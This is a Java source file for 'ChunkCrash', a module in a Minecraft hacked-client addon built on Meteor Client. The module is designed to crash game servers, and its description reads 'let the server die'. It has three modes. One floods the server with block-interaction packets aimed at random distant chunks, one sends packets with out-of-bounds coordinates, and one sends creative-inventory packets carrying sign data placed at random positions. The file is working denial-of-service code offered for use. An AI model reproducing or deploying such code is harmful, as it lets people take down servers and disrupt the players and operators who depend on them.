package uwu.taxevasion.allahhack.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import uwu.taxevasion.allahhack.Allah;

import java.util.Random;

public class ChunkCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("how to crash")
        .defaultValue(Modes.NOCOM)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("packets per tick")
        .defaultValue(15)
        .min(1)
        .sliderMax(100)
        .build());

    public ChunkCrash() {
        super(Allah.CATEGORY, "chunk-crash", "by the will of allah let the server die");
    }

    private final Random r = new Random();
    private Vec3d pickRandomPos() {
        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case NOCOM -> {
                if (mc.getNetworkHandler() == null) return;
                for (int i = 0; i < amount.get(); i++) {
                    Vec3d cpos = pickRandomPos();
                    PlayerInteractBlockC2SPacket PACKET = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false), 0);
                    mc.getNetworkHandler().sendPacket(PACKET);
                }
            }
            case OOB -> {
                PlayerInteractBlockC2SPacket oob = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(-1, -1, -1), Direction.UP, new BlockPos(Integer.MAX_VALUE, -1, Integer.MIN_VALUE), true), 0);
                mc.getNetworkHandler().sendPacket(oob);
            }
            case CREATIVE -> {
                for (int i = 0; i < amount.get(); i++) {
                    Vec3d cpos = pickRandomPos();
                    ItemStack owo = new ItemStack(Items.OAK_SIGN, 1);
                    NbtCompound nbt = owo.getOrCreateSubNbt("BlockEntityTag");
                    nbt.putInt("x", (int) cpos.x);
                    nbt.putInt("y", (int) cpos.y);
                    nbt.putInt("z", (int) cpos.z);
                    CreativeInventoryActionC2SPacket uwu = new CreativeInventoryActionC2SPacket(1, owo);
                    mc.getNetworkHandler().sendPacket(uwu);
                }
            }
        }
    }

    public enum Modes {
        OOB, NOCOM, CREATIVE
    }
}
